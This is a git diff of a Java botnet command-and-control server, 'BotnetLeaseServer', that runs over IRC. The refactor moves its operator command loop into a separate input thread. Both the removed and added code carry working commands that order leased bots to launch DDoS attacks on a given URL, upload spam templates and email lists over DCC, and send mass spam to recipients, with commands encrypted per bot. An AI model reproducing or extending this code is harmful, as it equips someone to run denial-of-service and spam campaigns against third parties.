@@ -126,7 +126,8 @@ public class BotnetLeaseServer extends PircBot {
 				System.out.print("\t" + bots[i].toString());
 			}
 		}
-		init();
+		InputThread it = new InputThread();
+		it.start();
 	}
 	
 	private void handshake(String name) {
@@ -171,23 +172,6 @@ public class BotnetLeaseServer extends PircBot {
 		}
 	}
 	
-	/**
-	 * Reads input from the user and handles the command.
-	 */
-	public void init() {
-		System.out.print("Command: ");
-		String message = input.nextLine();
-		while(!message.toLowerCase().equalsIgnoreCase("q")) {
-			try {
-				performCommand(message);
-				System.out.print("Command: ");
-				message = input.nextLine();
-			} catch (Exception e) {
-				e.printStackTrace();
-			}
-		}
-	}
-	
 	@Override
 	protected void onIncomingChatRequest(DccChat chat) {
 		System.out.println("incoming chat request from " + chat.getNick());
@@ -216,118 +200,7 @@ public class BotnetLeaseServer extends PircBot {
 		}
 	}
 	
-	/** 
-	 * <p>If s is a recognized command, the corresponding action is taken, 
-	 * otherwise if s begins with a colon it is interpreted as a private message to the channel 
-	 * and finally if it is not a command or a private message to the channel then it is sent 
-	 * as a raw message the IRC server.</p>
-	 * 
-	 * @param s A command/message to be interpreted
-	 */
-	public void performCommand(String s) throws Exception {
-		System.out.println(s);
-		//Respond to a help command with a shit ton of printlns.
-		if (s.toLowerCase().equalsIgnoreCase("help")) {
-			printHelp();
-		//Respond to a list command by listing all channels (DOESN'T WORK)
-		} else if (s.toLowerCase().equalsIgnoreCase("listpeeps")) {
-			listChannels();
-		//Respond to a names command by getting the user on CHANNEL and printing their nicks
-		} else if (s.toLowerCase().equals("names")) {
-			String[] bots = getUserNames();
-			for (String name : bots) {
-				System.out.println("\t" + name);
-			}
-		//Respond to setop command by acquiring exclusive operator status (DOESN'T WORK)
-		} else if (s.toLowerCase().equalsIgnoreCase("setop")) {
-			acquireOpStatus();
-		//Respond to a ddos command by gathering the arguments and private messaging each specified bot
-		} else if (s.toLowerCase().startsWith("ddos")) {
-			String[] parts = s.split(" ");
-			if (parts.length < 5) {
-				System.out.println("\tUsage: DDOS url interval duration bot [more bots]");
-			} else {
-				String[] botNames = chooseBots(parts, 4);
-				String command = parts[0] + " " + parts[1] + " " + parts[2] + " " + parts[3];
-				for (String name : botNames) {
-					if (!name.equals(NAME)) {
-						// TODO: encrypt command
-						//this.sendMessage(name, command);
-						this.sendMessage(name, botKeys.get(name).encryptMsg(command));
-					}
-				}
-			}
-		//Respond to a spam command by sending over the spam template file and emails file and then initiating a spam attack
-		} else if (s.toLowerCase().startsWith("spamupload")) {
-			String[] parts = s.split(" ");
-			if (parts.length < 4) {
-				System.out.println("Usage: spamupload template emails bot [more bots]");
-			} else {
-				String[] botNames = chooseBots(parts, 3);
-				for (String name : botNames) {
-					if (!name.equals(NAME)) {
-						dccSendFile(new File(parts[1]), name, TIMEOUT);
-						dccSendFile(new File(parts[2]), name, TIMEOUT);
-					}
-				}
-			}
-		//Respond to spam command by selecting numbots bots and issuing the command	
-		} else if (s.toLowerCase().startsWith("spam")) {
-			try {
-				String[] peices = s.split("'");
-				String[] firstArgs = peices[0].trim().split(" ");
-				String[] lastArgs = peices[8].split(" ");
-				lastArgs = Arrays.copyOfRange(lastArgs, 1, lastArgs.length);
-				
-				List<String> list = new ArrayList<String>();
-				for (String arg : firstArgs) {
-					list.add(arg);
-				}
-				list.add("'" + peices[1] + "'");
-				list.add("'" + peices[3] + "'");
-				list.add("'" + peices[5] + "'");
-				list.add("'" + peices[7] + "'");
-				for (String arg : lastArgs) {
-					list.add(arg);
-				}
-				
-				String[] parts = list.toArray(new String[0]);
-				
-				if (parts.length < 7) {
-					System.out.println(list);
-					System.out.println(Arrays.toString(parts));
-					System.out.println("Usage: spam numBots 'xxx' 'yyy' 'zzz' subject recipient [more recipients]");
-				} else {
-					String[] bots = leasedBots;
-					if (!parts[1].equalsIgnoreCase("all")) {
-						int numBots = Integer.parseInt(parts[1]);
-						if (bots.length > numBots) {
-							bots = Arrays.copyOfRange(bots, 0, numBots + 1);
-						}
-					}
-					String command = parts[0];
-					for (int i = 2; i < parts.length; i++) {
-						command += " " + parts[i];
-					}
-					for (String name : bots) {
-						// TODO: encrypt command
-						//sendMessage(name, command);
-						sendMessage(name, botKeys.get(name).encryptMsg(command));
-					}
-				}
-			} catch (Exception e) {
-				e.printStackTrace();
-				System.out.println("Usage: spam numBots 'xxx' 'yyy' 'zzz' subject recipient [more recipients]");
-			}
-		//Respond to a message beginning with a colon by messaging the CHANNEL
-		} else if (s.startsWith(":")) {
-			// TODO: encrypt s.substring
-			User[] bots = getUsers(CHANNEL);
-			for (User bot : bots) {
-				sendMessage(bot.getNick(), s.substring(1));
-			}
-		}
-	}
+	
 	
 	public String[] chooseBots(String[] arr, int index) {
 		if (arr[index].equalsIgnoreCase("all")) {
@@ -392,5 +265,145 @@ public class BotnetLeaseServer extends PircBot {
 		System.out.println("\t\ta random person in the bots random emails list. The numbots argument specifies how many bots will send the messages, ");
 		System.out.println("\t\tthe number will not be respected if it exceeds the size of the botnet.");
 		System.out.println("\t\tUsage: spam numBots xxx yyy zzz subject recipient [more recipients]");
+	}
+	
+	private class InputThread extends Thread {
+		Scanner input;
+		//BotnetLeaseServer delegate;
+		
+		public InputThread() {
+			//this.delegate = delegate;
+			input = new Scanner(System.in);
+		}
+		
+		/**
+		 * Reads input from the user and handles the command.
+		 */
+		public void run() {
+			System.out.print("Command: ");
+			String message = input.nextLine();
+			while(!message.toLowerCase().equalsIgnoreCase("q")) {
+				try {
+					performCommand(message);
+					System.out.print("Command: ");
+					message = input.nextLine();
+				} catch (Exception e) {
+					e.printStackTrace();
+				}
+			}
+		}
+		
+		/** 
+		 * <p>If s is a recognized command, the corresponding action is taken, 
+		 * otherwise if s begins with a colon it is interpreted as a private message to the channel 
+		 * and finally if it is not a command or a private message to the channel then it is sent 
+		 * as a raw message the IRC server.</p>
+		 * 
+		 * @param s A command/message to be interpreted
+		 */
+		public void performCommand(String s) throws Exception {
+			System.out.println(s);
+			//Respond to a help command with a shit ton of printlns.
+			if (s.toLowerCase().equalsIgnoreCase("help")) {
+				printHelp();
+			//Respond to a list command by listing all channels (DOESN'T WORK)
+			} else if (s.toLowerCase().equalsIgnoreCase("listpeeps")) {
+				listChannels();
+			//Respond to a names command by getting the user on CHANNEL and printing their nicks
+			} else if (s.toLowerCase().equals("names")) {
+				String[] bots = getUserNames();
+				for (String name : bots) {
+					System.out.println("\t" + name);
+				}
+			//Respond to setop command by acquiring exclusive operator status (DOESN'T WORK)
+			} else if (s.toLowerCase().equalsIgnoreCase("setop")) {
+				acquireOpStatus();
+			//Respond to a ddos command by gathering the arguments and private messaging each specified bot
+			} else if (s.toLowerCase().startsWith("ddos")) {
+				String[] parts = s.split(" ");
+				if (parts.length < 5) {
+					System.out.println("\tUsage: DDOS url interval duration bot [more bots]");
+				} else {
+					String[] botNames = chooseBots(parts, 4);
+					String command = parts[0] + " " + parts[1] + " " + parts[2] + " " + parts[3];
+					for (String name : botNames) {
+						if (!name.equals(NAME)) {
+							// TODO: encrypt command
+							//this.sendMessage(name, command);
+							sendMessage(name, botKeys.get(name).encryptMsg(command));
+						}
+					}
+				}
+			//Respond to a spam command by sending over the spam template file and emails file and then initiating a spam attack
+			} else if (s.toLowerCase().startsWith("spamupload")) {
+				String[] parts = s.split(" ");
+				if (parts.length < 4) {
+					System.out.println("Usage: spamupload template emails bot [more bots]");
+				} else {
+					String[] botNames = chooseBots(parts, 3);
+					for (String name : botNames) {
+						if (!name.equals(NAME)) {
+							dccSendFile(new File(parts[1]), name, TIMEOUT);
+							dccSendFile(new File(parts[2]), name, TIMEOUT);
+						}
+					}
+				}
+			//Respond to spam command by selecting numbots bots and issuing the command	
+			} else if (s.toLowerCase().startsWith("spam")) {
+				try {
+					String[] peices = s.split("'");
+					String[] firstArgs = peices[0].trim().split(" ");
+					String[] lastArgs = peices[8].split(" ");
+					lastArgs = Arrays.copyOfRange(lastArgs, 1, lastArgs.length);
+					
+					List<String> list = new ArrayList<String>();
+					for (String arg : firstArgs) {
+						list.add(arg);
+					}
+					list.add("'" + peices[1] + "'");
+					list.add("'" + peices[3] + "'");
+					list.add("'" + peices[5] + "'");
+					list.add("'" + peices[7] + "'");
+					for (String arg : lastArgs) {
+						list.add(arg);
+					}
+					
+					String[] parts = list.toArray(new String[0]);
+					
+					if (parts.length < 7) {
+						System.out.println(list);
+						System.out.println(Arrays.toString(parts));
+						System.out.println("Usage: spam numBots 'xxx' 'yyy' 'zzz' subject recipient [more recipients]");
+					} else {
+						String[] bots = leasedBots;
+						if (!parts[1].equalsIgnoreCase("all")) {
+							int numBots = Integer.parseInt(parts[1]);
+							if (bots.length > numBots) {
+								bots = Arrays.copyOfRange(bots, 0, numBots + 1);
+							}
+						}
+						String command = parts[0];
+						for (int i = 2; i < parts.length; i++) {
+							command += " " + parts[i];
+						}
+						for (String name : bots) {
+							// TODO: encrypt command
+							//sendMessage(name, command);
+							sendMessage(name, botKeys.get(name).encryptMsg(command));
+						}
+					}
+				} catch (Exception e) {
+					e.printStackTrace();
+					System.out.println("Usage: spam numBots 'xxx' 'yyy' 'zzz' subject recipient [more recipients]");
+				}
+			//Respond to a message beginning with a colon by messaging the CHANNEL
+			} else if (s.startsWith(":")) {
+				// TODO: encrypt s.substring
+				User[] bots = getUsers(CHANNEL);
+				for (User bot : bots) {
+					sendMessage(bot.getNick(), s.substring(1));
+				}
+			}
+		}
 	}
 }
